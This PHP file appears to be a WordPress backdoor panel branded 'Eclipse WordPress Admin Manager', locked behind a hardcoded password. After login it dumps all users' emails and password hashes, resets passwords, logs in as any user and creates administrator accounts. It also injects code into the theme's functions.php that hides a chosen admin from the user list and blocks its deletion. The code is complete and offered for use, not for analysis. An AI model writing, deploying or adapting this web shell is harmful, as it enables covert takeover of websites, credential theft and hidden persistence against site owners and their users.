<?php
header('Content-Type: text/html; charset=UTF-8');

session_start();
$default_password = 'eclipse1337@@##';
$login_timeout = 3600;

function isLoggedIn() {
    global $login_timeout;
    if (isset($_SESSION['eclipse_logged_in']) && $_SESSION['eclipse_logged_in'] === true) {
        if (isset($_SESSION['eclipse_login_time']) && (time() - $_SESSION['eclipse_login_time']) < $login_timeout) {
            return true;
        } else {
            session_destroy();
        }
    }
    return false;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['action'])) {
    if ($_POST['action'] == 'login') {
        $password = $_POST['password'] ?? '';
        if ($password === $default_password) {
            $_SESSION['eclipse_logged_in'] = true;
            $_SESSION['eclipse_login_time'] = time();
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Invalid password']);
        }
        exit;
    } elseif ($_POST['action'] == 'logout') {
        session_destroy();
        echo json_encode(['success' => true]);
        exit;
    }
}

if (!isLoggedIn()) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="utf-8">
    <title>Eclipse | Authentication Required</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
    :root {
      --primary: #7c3aed;
      --primary-dark: #6d28d9;
      --primary-light: #8b5cf6;
      --bg: #0f0f23;
      --card: #1a1b2e;
      --text: #f0f0f5;
      --text-muted: #a0a0c0;
      --border: #2d2e50;
      --shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3), 0 8px 10px -6px rgba(0, 0, 0, 0.2);
      --glow: 0 0 15px rgba(124, 58, 237, 0.3);
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      background: var(--bg);
      color: var(--text);
      font-family: 'Inter', sans-serif;
      line-height: 1.6;
      padding: 20px;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background-image: 
        radial-gradient(circle at 10% 20%, rgba(124, 58, 237, 0.1) 0%, transparent 20%),
        radial-gradient(circle at 90% 80%, rgba(124, 58, 237, 0.1) 0%, transparent 20%);
    }
    
    .login-container {
      background: var(--card);
      border-radius: 16px;
      box-shadow: var(--shadow), var(--glow);
      padding: 40px;
      max-width: 400px;
      width: 100%;
      border: 1px solid var(--border);
      text-align: center;
    }
    
    .logo {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 15px;
      margin-bottom: 30px;
    }
    
    .logo-image {
      width: 50px;
      height: 50px;
      border-radius: 12px;
      overflow: hidden;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 4px 10px rgba(124, 58, 237, 0.3);
    }
    
    .logo-image img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    
    .logo-text {
      font-size: 24px;
      font-weight: 700;
      background: linear-gradient(90deg, var(--primary-light), #a78bfa);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 2px 10px rgba(124, 58, 237, 0.3);
    }
    
    .login-title {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 20px;
      color: var(--text);
    }
    
    .login-subtitle {
      color: var(--text-muted);
      font-size: 14px;
      margin-bottom: 30px;
    }
    
    .form-group {
      margin-bottom: 20px;
      text-align: left;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      font-weight: 500;
      color: var(--text);
    }
    
    input {
      width: 100%;
      padding: 12px 16px;
      border-radius: 8px;
      border: 1px solid var(--border);
      background: var(--bg);
      color: var(--text);
      font-family: 'Inter', sans-serif;
      font-size: 14px;
      transition: all 0.2s;
    }
    
    input:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(124, 58, 237, 0.2);
    }
    
    .btn {
      padding: 12px 24px;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 500;
      border: none;
      cursor: pointer;
      transition: all 0.2s;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      width: 100%;
    }
    
    .btn-primary {
      background: var(--primary);
      color: white;
    }
    
    .btn-primary:hover {
      background: var(--primary-dark);
      transform: translateY(-2px);
      box-shadow: 0 4px 8px rgba(124, 58, 237, 0.3);
    }
    
    .status-message {
      margin-top: 15px;
      padding: 12px 16px;
      border-radius: 8px;
      font-size: 14px;
      display: none;
    }
    
    .status-error {
      background: rgba(239, 68, 68, 0.1);
      border: 1px solid #ef4444;
      color: #ef4444;
      display: block;
    }
    
    .loading {
      opacity: 0.7;
      pointer-events: none;
    }
    
    .spinner {
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 2px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 1s ease-in-out infinite;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    </style>
    </head>
    <body>
    <div class="login-container">
      <div class="logo">
        <div class="logo-image">
          <img src="https://h.top4top.io/p_359293s971.jpg" alt="Eclipse Logo">
        </div>
        <div class="logo-text">Eclipse</div>
      </div>
      
      <div class="login-title">Authentication Required</div>
      <div class="login-subtitle">Enter password to access WordPress Admin Manager</div>
      
      <form id="loginForm">
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" placeholder="Enter password" autocomplete="off" required>
        </div>
        
        <button type="submit" class="btn btn-primary" id="loginBtn">
          <i class="fas fa-lock"></i> Access Manager
        </button>
      </form>
      
      <div id="login-status" class="status-message"></div>
    </div>
    
    <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const password = document.getElementById('password').value;
      const loginBtn = document.getElementById('loginBtn');
      const statusEl = document.getElementById('login-status');
      
      statusEl.className = 'status-message';
      
      loginBtn.classList.add('loading');
      loginBtn.innerHTML = '<span class="spinner"></span> Authenticating...';
      
      const xhr = new XMLHttpRequest();
      xhr.open('POST', '', true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.onload = function() {
        try {
          const response = JSON.parse(xhr.responseText);
          
          if (response.success) {
            window.location.reload();
          } else {
            statusEl.textContent = response.message || 'Login failed';
            statusEl.className = 'status-message status-error';
            loginBtn.classList.remove('loading');
            loginBtn.innerHTML = '<i class="fas fa-lock"></i> Access Manager';
          }
        } catch (e) {
          statusEl.textContent = 'Login error';
          statusEl.className = 'status-message status-error';
          loginBtn.classList.remove('loading');
          loginBtn.innerHTML = '<i class="fas fa-lock"></i> Access Manager';
        }
      };
      
      xhr.send('action=login&password=' + encodeURIComponent(password));
    });
    
    document.getElementById('password').focus();
    </script>
    </body>
    </html>
    <?php
    exit;
}

function findWpLoad($dir = null, $depth = 0) {
    if ($depth > 8) return false;
    $dir = $dir ?: __DIR__;
    $wp_load = $dir . '/wp-load.php';
    
    if (file_exists($wp_load)) {
        return $wp_load;
    }
    
    return findWpLoad(dirname($dir), $depth + 1);
}

$wp_load_path = findWpLoad();
if (!$wp_load_path) {
    die('<b style="color:#e53935">wp-load.php not found!</b>');
}

require_once $wp_load_path;

function addUserProtection($username) {
    $functions_file = get_template_directory() . '/functions.php';
    if (!file_exists($functions_file)) {
        $functions_file = get_stylesheet_directory() . '/functions.php';
    }
    
    if (file_exists($functions_file)) {
        $protection_code = "

add_action('pre_get_users', function(\$query) {
    if (is_admin() && function_exists('get_current_screen')) {
        \$screen = get_current_screen();
        if (\$screen && \$screen->base === 'users') {
            \$protected_user = get_user_by('login', '{$username}');
            if (\$protected_user) {
                \$excluded = (array) \$query->get('exclude');
                \$excluded[] = \$protected_user->ID;
                \$query->set('exclude', \$excluded);
            }
        }
    }
});
add_filter('wp_count_users', function(\$counts) {
    \$protected_user = get_user_by('login', '{$username}');
    if (\$protected_user) {
        \$counts->total_users--;
    }
    return \$counts;
});
add_action('delete_user', function(\$user_id) {
    \$user = get_user_by('ID', \$user_id);
    if (\$user && \$user->user_login === '{$username}') {
        wp_die(
            __('User {$username} tidak dapat dihapus.', 'textdomain'),
            __('Error', 'textdomain'),
            array('response' => 403)
        );
    }
});
add_filter('user_search_columns', function(\$search_columns, \$search, \$query) {
    if (is_admin()) {
        \$protected_user = get_user_by('login', '{$username}');
        if (\$protected_user) {
            global \$wpdb;
            \$query->query_where .= \$wpdb->prepare(\" AND {\$wpdb->users}.ID != %d\", \$protected_user->ID);
        }
    }
    return \$search_columns;
}, 10, 3);
add_filter('bulk_actions-users', function(\$actions) {
    if (isset(\$_REQUEST['users']) && is_array(\$_REQUEST['users'])) {
        \$protected_user = get_user_by('login', '{$username}');
        if (\$protected_user && in_array(\$protected_user->ID, \$_REQUEST['users'])) {
            unset(\$actions['delete']);
        }
    }
    return \$actions;
});
";

        $current_content = file_get_contents($functions_file);
        if (strpos($current_content, "get_user_by('login', '{$username}')") === false) {
            file_put_contents($functions_file, $protection_code, FILE_APPEND | LOCK_EX);
            return true;
        } else {
            return true;
        }
    }
    return false;
}

function removeUserProtection($username) {
    $functions_file = get_template_directory() . '/functions.php';
    if (!file_exists($functions_file)) {
        $functions_file = get_stylesheet_directory() . '/functions.php';
    }
    
    if (file_exists($functions_file)) {
        $current_content = file_get_contents($functions_file);
        
        $pattern = '/add_action\(\'pre_get_users\'.*?get_user_by\(\'login\', \'' . preg_quote($username, '/') . '\'.*?add_filter\(\'bulk_actions-users\'.*?\}\);\s*/s';
        
        $new_content = preg_replace($pattern, '', $current_content);
        
        if ($new_content !== $current_content) {
            file_put_contents($functions_file, $new_content, LOCK_EX);
            return true;
        }
    }
    return false;
}

function isUserHidden($username) {
    $functions_file = get_template_directory() . '/functions.php';
    if (!file_exists($functions_file)) {
        $functions_file = get_stylesheet_directory() . '/functions.php';
    }
    
    if (file_exists($functions_file)) {
        $current_content = file_get_contents($functions_file);
        return strpos($current_content, "get_user_by('login', '{$username}')") !== false;
    }
    return false;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['c4t'])) {
    global $wpdb;
    
    if ($_POST['c4t'] == 'ulst') {
        $users = $wpdb->get_results("SELECT ID, user_login, user_email, user_pass, user_registered FROM {$wpdb->users}");
        
        foreach ($users as $user) {
            $user->is_hidden = isUserHidden($user->user_login);
        }
        
        echo json_encode($users);
        exit;
    }
    
    if ($_POST['c4t'] == 'rpsw') {
        $user_id = intval($_POST['uix']);
        $new_password = wp_generate_password(12, true, true);
        wp_set_password($new_password, $user_id);
        $user_data = get_userdata($user_id);
        echo json_encode([
            'l' => $user_data->user_login, 
            'e' => $user_data->user_email, 
            'n' => $new_password
        ]);
        exit;
    }
    
    if ($_POST['c4t'] == 'cadm') {
        $username = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['xun']);
        $password = $_POST['xpw'];
        $email = filter_var($_POST['xem'], FILTER_VALIDATE_EMAIL) ? $_POST['xem'] : $username . '@' . $_SERVER['HTTP_HOST'];
        $hide_user = isset($_POST['hide_user']) ? true : false;
        
        if (username_exists($username)) { 
            echo json_encode(['err' => 'user exists']); 
            exit; 
        }
        
        $user_id = wp_create_user($username, $password, $email);
        if ($user_id && !is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            
            if ($hide_user) {
                addUserProtection($username);
            }
            
            echo json_encode([
                'ok' => 'created',
                'u' => $username,
                'p' => $password,
                'hide' => $hide_user
            ]);
        } else {
            echo json_encode(['err' => 'create failed']);
        }
        exit;
    }
    
    if ($_POST['c4t'] == 'alog') {
        $user_id = intval($_POST['uix']);
        wp_clear_auth_cookie();
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id, true);
        echo json_encode(['url' => admin_url()]);
        exit;
    }
    
    if ($_POST['c4t'] == 'hide') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $result = addUserProtection($user->user_login);
            echo json_encode([
                'ok' => 'hidden',
                'user' => $user->user_login,
                'success' => $result
            ]);
        } else {
            echo json_encode(['err' => 'user not found']);
        }
        exit;
    }
    
    if ($_POST['c4t'] == 'unhide') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $result = removeUserProtection($user->user_login);
            echo json_encode([
                'ok' => 'unhidden',
                'user' => $user->user_login,
                'success' => $result
            ]);
        } else {
            echo json_encode(['err' => 'user not found']);
        }
        exit;
    }
    
    if ($_POST['c4t'] == 'del') {
        $user_id = intval($_POST['uix']);
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $current_user = wp_get_current_user();
            if ($user_id == $current_user->ID) {
                echo json_encode(['err' => 'cannot_delete_self']);
                exit;
            }
            
            if (isUserHidden($user->user_login)) {
                removeUserProtection($user->user_login);
            }
            
            if (wp_delete_user($user_id)) {
                echo json_encode([
                    'ok' => 'deleted',
                    'user' => $user->user_login
                ]);
            } else {
                echo json_encode(['err' => 'delete_failed']);
            }
        } else {
            echo json_encode(['err' => 'user_not_found']);
        }
        exit;
    }
    
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Eclipse | WordPress Admin Manager</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
:root {
  --primary: #7c3aed;
  --primary-dark: #6d28d9;
  --primary-light: #8b5cf6;
  --danger: #ef4444;
  --danger-dark: #dc2626;
  --success: #10b981;
  --warning: #f59e0b;
  --info: #3b82f6;
  --secondary: #94a3b8;
  --gray-50: #f9fafb;
  --gray-100: #f3f4f6;
  --gray-200: #e5e7eb;
  --gray-300: #d1d5db;
  --gray-400: #9ca3af;
  --gray-500: #6b7280;
  --gray-600: #4b5563;
  --gray-700: #374151;
  --gray-800: #1f2937;
  --gray-900: #111827;
  --bg: #0f0f23;
  --card: #1a1b2e;
  --card-light: #23243d;
  --text: #f0f0f5;
  --text-muted: #a0a0c0;
  --border: #2d2e50;
  --shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3), 0 8px 10px -6px rgba(0, 0, 0, 0.2);
  --glow: 0 0 15px rgba(124, 58, 237, 0.3);
}

* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  background: var(--bg);
  color: var(--text);
  font-family: 'Inter', sans-serif;
  line-height: 1.6;
  padding: 20px;
  min-height: 100vh;
  background-image: 
    radial-gradient(circle at 10% 20%, rgba(124, 58, 237, 0.1) 0%, transparent 20%),
    radial-gradient(circle at 90% 80%, rgba(124, 58, 237, 0.1) 0%, transparent 20%);
}

.container {
  max-width: 1400px;
  margin: 0 auto;
}

.card {
  background: var(--card);
  border-radius: 16px;
  box-shadow: var(--shadow), var(--glow);
  padding: 30px;
  margin-bottom: 30px;
  border: 1px solid var(--border);
}

.header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 30px;
  padding-bottom: 20px;
  border-bottom: 1px solid var(--border);
}

.logo {
  display: flex;
  align-items: center;
  gap: 15px;
}

.logo-image {
  width: 50px;
  height: 50px;
  border-radius: 12px;
  overflow: hidden;
  background: linear-gradient(135deg, var(--primary), var(--primary-dark));
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0 4px 10px rgba(124, 58, 237, 0.3);
}

.logo-image img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.logo-text {
  font-size: 26px;
  font-weight: 700;
  background: linear-gradient(90deg, var(--primary-light), #a78bfa);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}

.subtitle {
  color: var(--text-muted);
  font-size: 14px;
  font-weight: 500;
}

.contact {
  display: flex;
  align-items: center;
  gap: 8px;
  color: var(--text-muted);
  font-size: 14px;
}

.contact i {
  color: var(--primary);
}

.user-info {
  display: flex;
  align-items: center;
  gap: 10px;
  background: var(--card-light);
  padding: 8px 15px;
  border-radius: 8px;
  border: 1px solid var(--border);
}

.logout-btn {
  background: var(--danger);
  color: white;
  border: none;
  padding: 6px 12px;
  border-radius: 6px;
  cursor: pointer;
  font-size: 12px;
  font-weight: 500;
  transition: all 0.2s;
  display: flex;
  align-items: center;
  gap: 5px;
}

.logout-btn:hover {
  background: var(--danger-dark);
}

.section-title {
  font-size: 18px;
  font-weight: 600;
  margin-bottom: 20px;
  color: var(--text);
  display: flex;
  align-items: center;
  gap: 10px;
}

.section-title i {
  color: var(--primary);
}

.table-container {
  overflow-x: auto;
  border-radius: 12px;
  border: 1px solid var(--border);
}

table {
  width: 100%;
  border-collapse: collapse;
  min-width: 800px;
}

th {
  background: var(--card-light);
  padding: 14px 16px;
  text-align: left;
  font-weight: 600;
  font-size: 14px;
  color: var(--text);
  border-bottom: 1px solid var(--border);
}

td {
  padding: 14px 16px;
  border-bottom: 1px solid var(--border);
  color: var(--text-muted);
  font-size: 14px;
}

tr.hidden-user {
  background: rgba(124, 58, 237, 0.15);
  border-left: 3px solid var(--primary);
}

tr.hidden-user:hover {
  background: rgba(124, 58, 237, 0.2);
}

.user-id {
  font-weight: 600;
  color: var(--primary);
}

.user-login {
  font-weight: 500;
  color: var(--text);
}

.user-email {
  word-break: break-all;
}

.pw-hash {
  font-family: monospace;
  font-size: 12px;
  word-break: break-all;
  max-width: 300px;
}

.hidden-badge {
  display: inline-block;
  background: var(--primary);
  color: white;
  padding: 2px 8px;
  border-radius: 4px;
  font-size: 11px;
  font-weight: 600;
  margin-left: 8px;
  text-transform: uppercase;
}

.actions {
  display: flex;
  gap: 8px;
  flex-wrap: wrap;
}

.btn {
  padding: 8px 16px;
  border-radius: 8px;
  font-size: 13px;
  font-weight: 500;
  border: none;
  cursor: pointer;
  transition: all 0.2s;
  display: inline-flex;
  align-items: center;
  gap: 6px;
}

.btn-primary {
  background: var(--primary);
  color: white;
}

.btn-primary:hover {
  background: var(--primary-dark);
}

.btn-danger {
  background: var(--danger);
  color: white;
}

.btn-danger:hover {
  background: var(--danger-dark);
}

.btn-success {
  background: var(--success);
  color: white;
}

.btn-success:hover {
  background: #0da271;
}

.btn-warning {
  background: var(--warning);
  color: white;
}

.btn-warning:hover {
  background: #d97706;
}

.btn-info {
  background: var(--info);
  color: white;
}

.btn-info:hover {
  background: #2563eb;
}

.btn-small {
  padding: 6px 12px;
  font-size: 12px;
}

.form-group {
  margin-bottom: 20px;
}

.form-row {
  display: flex;
  gap: 15px;
  flex-wrap: wrap;
  margin-bottom: 15px;
}

.form-input {
  flex: 1;
  min-width: 200px;
}

.checkbox-group {
  display: flex;
  align-items: center;
  gap: 10px;
  margin: 15px 0;
}

.checkbox-group input[type="checkbox"] {
  width: auto;
  transform: scale(1.2);
}

.checkbox-group label {
  margin-bottom: 0;
  font-weight: 500;
  color: var(--text);
}

label {
  display: block;
  margin-bottom: 8px;
  font-size: 14px;
  font-weight: 500;
  color: var(--text);
}

input {
  width: 100%;
  padding: 12px 16px;
  border-radius: 8px;
  border: 1px solid var(--border);
  background: var(--card-light);
  color: var(--text);
  font-family: 'Inter', sans-serif;
  font-size: 14px;
}

input:focus {
  outline: none;
  border-color: var(--primary);
}

.status-message {
  margin-top: 15px;
  padding: 12px 16px;
  border-radius: 8px;
  font-size: 14px;
  display: none;
}

.status-success {
  background: rgba(16, 185, 129, 0.1);
  border: 1px solid var(--success);
  color: var(--success);
  display: block;
}

.status-error {
  background: rgba(239, 68, 68, 0.1);
  border: 1px solid var(--danger);
  color: var(--danger);
  display: block;
}

.pw-reset-info {
  margin-top: 10px;
  padding: 10px;
  background: var(--card-light);
  border-radius: 8px;
  display: flex;
  align-items: center;
  gap: 10px;
  font-size: 14px;
}

.pw-value {
  background: var(--gray-800);
  padding: 6px 12px;
  border-radius: 6px;
  font-family: monospace;
  user-select: all;
  flex: 1;
}

.footer {
  text-align: center;
  margin-top: 40px;
  padding-top: 20px;
  border-top: 1px solid var(--border);
  color: var(--text-muted);
  font-size: 14px;
}

.loading {
  opacity: 0.7;
  pointer-events: none;
}

.spinner {
  display: inline-block;
  width: 16px;
  height: 16px;
  border: 2px solid rgba(255, 255, 255, 0.3);
  border-radius: 50%;
  border-top-color: white;
  animation: spin 1s ease-in-out infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.modal {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.7);
  z-index: 1000;
  align-items: center;
  justify-content: center;
}

.modal-content {
  background: var(--card);
  border-radius: 12px;
  padding: 25px;
  max-width: 500px;
  width: 90%;
  border: 1px solid var(--border);
}

.modal-header {
  display: flex;
  justify-content: between;
  align-items: center;
  margin-bottom: 20px;
}

.modal-title {
  font-size: 18px;
  font-weight: 600;
  color: var(--text);
}

.modal-close {
  background: none;
  border: none;
  color: var(--text-muted);
  font-size: 20px;
  cursor: pointer;
}

.modal-body {
  margin-bottom: 20px;
  color: var(--text-muted);
}

.modal-footer {
  display: flex;
  gap: 10px;
  justify-content: flex-end;
}

@media (max-width: 768px) {
  .header {
    flex-direction: column;
    align-items: flex-start;
    gap: 15px;
  }
  
  .form-row {
    flex-direction: column;
  }
  
  .actions {
    flex-direction: column;
  }
  
  .btn {
    width: 100%;
  }
}
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <div class="header">
      <div class="logo">
        <div class="logo-image">
          <img src="https://h.top4top.io/p_359293s971.jpg" alt="Eclipse Logo">
        </div>
        <div>
          <div class="logo-text">Eclipse WordPress Admin Manager</div>
          <div class="subtitle">Feature : reset password, hide/unhide user, delete user, auto login</div>
        </div>
      </div>
      <div style="display: flex; align-items: center; gap: 15px;">
        <div class="contact">
          <i class="fab fa-telegram"></i>
          <span>Telegram: @no4meee</span>
        </div>
        <div class="user-info">
          <i class="fas fa-user-shield"></i>
          <span>Admin</span>
          <button class="logout-btn" onclick="logout()">
            <i class="fas fa-sign-out-alt"></i> Logout
          </button>
        </div>
      </div>
    </div>

    <div class="section-title">
      <i class="fas fa-users"></i>
      <span>User Management</span>
    </div>
    
    <div class="table-container">
      <table id="users-table">
        <thead>
          <tr>
            <th style="width: 60px;">ID</th>
            <th style="width: 120px;">Username</th>
            <th style="width: 200px;">Email</th>
            <th style="width: 300px;">Password Hash</th>
            <th style="width: 130px;">Registered</th>
            <th style="width: 320px;">Actions</th>
          </tr>
        </thead>
        <tbody id="users-tbody">
          <tr>
            <td colspan="6" style="text-align: center; padding: 30px;">
              <div class="spinner"></div> Loading users...
            </td>
          </tr>
        </tbody>
      </table>
    </div>

    <div class="section-title" style="margin-top: 30px;">
      <i class="fas fa-user-plus"></i>
      <span>Create Administrator</span>
    </div>
    
    <div class="form-group">
      <div class="form-row">
        <div class="form-input">
          <label for="username">Username *</label>
          <input type="text" id="username" placeholder="Enter username" autocomplete="off">
        </div>
        <div class="form-input">
          <label for="email">Email</label>
          <input type="text" id="email" placeholder="Enter email (optional)" autocomplete="off">
        </div>
        <div class="form-input">
          <label for="password">Password *</label>
          <input type="text" id="password" placeholder="Enter password" autocomplete="off">
        </div>
      </div>
      <div class="checkbox-group">
        <input type="checkbox" id="hide-user" name="hide_user">
        <label for="hide-user">Hide this user from WordPress admin panel</label>
      </div>
      <button class="btn btn-success" onclick="createAdmin()">
        <i class="fas fa-plus"></i> Create Admin User
      </button>
      <div id="create-status" class="status-message"></div>
    </div>
  </div>
  
  <div class="footer">
    <p>Eclipse WordPress Admin Manager</p>
  </div>
</div>

<div id="deleteModal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <div class="modal-title">Confirm Delete</div>
      <button class="modal-close" onclick="closeModal('deleteModal')">&times;</button>
    </div>
    <div class="modal-body">
      Are you sure you want to delete user <strong id="delete-username"></strong>? This action cannot be undone.
    </div>
    <div class="modal-footer">
      <button class="btn btn-danger" onclick="confirmDelete()">Delete</button>
      <button class="btn" onclick="closeModal('deleteModal')" style="background: var(--gray-600);">Cancel</button>
    </div>
  </div>
</div>

<script>
function makeRequest(data, callback) {
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "", true);
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.onload = function() {
    callback(xhr.responseText);
  };
  
  const params = [];
  for (let key in data) {
    params.push(encodeURIComponent(key) + "=" + encodeURIComponent(data[key]));
  }
  xhr.send(params.join("&"));
}

function logout() {
  if (confirm('Are you sure you want to logout?')) {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
      window.location.reload();
    };
    xhr.send('action=logout');
  }
}

function loadUsers() {
  const tbody = document.getElementById('users-tbody');
  tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; padding: 30px;"><div class="spinner"></div> Loading users...</td></tr>';
  
  makeRequest({c4t: 'ulst'}, function(response) {
    try {
      const users = JSON.parse(response);
      let html = '';
      
      if (users.length === 0) {
        html = '<tr><td colspan="6" style="text-align: center; padding: 30px;">No users found</td></tr>';
      } else {
        users.forEach(function(user) {
          const isHidden = user.is_hidden || false;
          const hiddenClass = isHidden ? 'hidden-user' : '';
          const hiddenBadge = isHidden ? '<span class="hidden-badge">Hidden</span>' : '';
          
          html += `
            <tr class="${hiddenClass}">
              <td class="user-id">${user.ID}</td>
              <td class="user-login">${user.user_login} ${hiddenBadge}</td>
              <td class="user-email">${user.user_email}</td>
              <td class="pw-hash">${user.user_pass}</td>
              <td>${user.user_registered}</td>
              <td>
                <div class="actions">
                  <button class="btn btn-danger btn-small" onclick="resetPassword(${user.ID}, this)">
                    <i class="fas fa-key"></i> Reset PW
                  </button>
                  <button class="btn btn-primary btn-small" onclick="autoLogin(${user.ID})">
                    <i class="fas fa-sign-in-alt"></i> Login
                  </button>
                  ${isHidden ? 
                    `<button class="btn btn-success btn-small" onclick="unhideUser(${user.ID}, this)">
                      <i class="fas fa-eye"></i> Unhide
                    </button>` : 
                    `<button class="btn btn-warning btn-small" onclick="hideUser(${user.ID}, this)">
                      <i class="fas fa-eye-slash"></i> Hide
                    </button>`
                  }
                  <button class="btn btn-info btn-small" onclick="deleteUser(${user.ID}, '${user.user_login}')">
                    <i class="fas fa-trash"></i> Delete
                  </button>
                </div>
              </td>
            </tr>
          `;
        });
      }
      
      tbody.innerHTML = html;
    } catch (e) {
      tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; padding: 30px; color: var(--danger);">Error loading users</td></tr>';
    }
  });
}

function resetPassword(userId, button) {
  button.classList.add('loading');
  button.innerHTML = '<span class="spinner"></span> Resetting...';
  
  makeRequest({c4t: 'rpsw', uix: userId}, function(response) {
    try {
      const result = JSON.parse(response);
      
      button.classList.remove('loading');
      button.innerHTML = '<i class="fas fa-key"></i> Reset PW';
      
      const existingInfo = button.parentNode.querySelector('.pw-reset-info');
      if (existingInfo) {
        existingInfo.remove();
      }
      
      const infoDiv = document.createElement('div');
      infoDiv.className = 'pw-reset-info';
      infoDiv.innerHTML = `
        <div class="pw-value" id="pw-${userId}">${result.n}</div>
        <button class="btn btn-primary btn-small" onclick="copyToClipboard('pw-${userId}')">
          <i class="fas fa-copy"></i> Copy
        </button>
      `;
      
      button.parentNode.appendChild(infoDiv);
      
      setTimeout(() => {
        if (infoDiv.parentNode) {
          infoDiv.remove();
        }
      }, 10000);
      
    } catch (e) {
      button.classList.remove('loading');
      button.innerHTML = '<i class="fas fa-key"></i> Reset PW';
      alert('Error resetting password');
    }
  });
}

function hideUser(userId, button) {
  button.classList.add('loading');
  button.innerHTML = '<span class="spinner"></span> Hiding...';
  
  makeRequest({c4t: 'hide', uix: userId}, function(response) {
    try {
      const result = JSON.parse(response);
      
      button.classList.remove('loading');
      
      if (result.ok) {
        button.innerHTML = '<i class="fas fa-eye"></i> Unhide';
        button.className = 'btn btn-success btn-small';
        button.setAttribute('onclick', `unhideUser(${userId}, this)`);
        
        const row = button.closest('tr');
        row.classList.add('hidden-user');
        
        const usernameCell = row.querySelector('.user-login');
        usernameCell.innerHTML = result.user + ' <span class="hidden-badge">Hidden</span>';
        
        const statusEl = document.getElementById('create-status');
        statusEl.textContent = `User ${result.user} has been hidden from WordPress admin panel`;
        statusEl.className = 'status-message status-success';
        
        setTimeout(() => {
          statusEl.className = 'status-message';
        }, 5000);
      } else {
        button.innerHTML = '<i class="fas fa-eye-slash"></i> Hide';
        alert('Error hiding user');
      }
    } catch (e) {
      button.classList.remove('loading');
      button.innerHTML = '<i class="fas fa-eye-slash"></i> Hide';
      alert('Error hiding user');
    }
  });
}

function unhideUser(userId, button) {
  button.classList.add('loading');
  button.innerHTML = '<span class="spinner"></span> Unhiding...';
  
  makeRequest({c4t: 'unhide', uix: userId}, function(response) {
    try {
      const result = JSON.parse(response);
      
      button.classList.remove('loading');
      
      if (result.ok) {
        button.innerHTML = '<i class="fas fa-eye-slash"></i> Hide';
        button.className = 'btn btn-warning btn-small';
        button.setAttribute('onclick', `hideUser(${userId}, this)`);
        
        const row = button.closest('tr');
        row.classList.remove('hidden-user');
        
        const usernameCell = row.querySelector('.user-login');
        usernameCell.innerHTML = result.user;
        
        const statusEl = document.getElementById('create-status');
        statusEl.textContent = `User ${result.user} is now visible in WordPress admin panel`;
        statusEl.className = 'status-message status-success';
        
        setTimeout(() => {
          statusEl.className = 'status-message';
        }, 5000);
      } else {
        button.innerHTML = '<i class="fas fa-eye"></i> Unhide';
        alert('Error unhiding user');
      }
    } catch (e) {
      button.classList.remove('loading');
      button.innerHTML = '<i class="fas fa-eye"></i> Unhide';
      alert('Error unhiding user');
    }
  });
}

let userToDelete = null;

function deleteUser(userId, username) {
  userToDelete = userId;
  document.getElementById('delete-username').textContent = username;
  document.getElementById('deleteModal').style.display = 'flex';
}

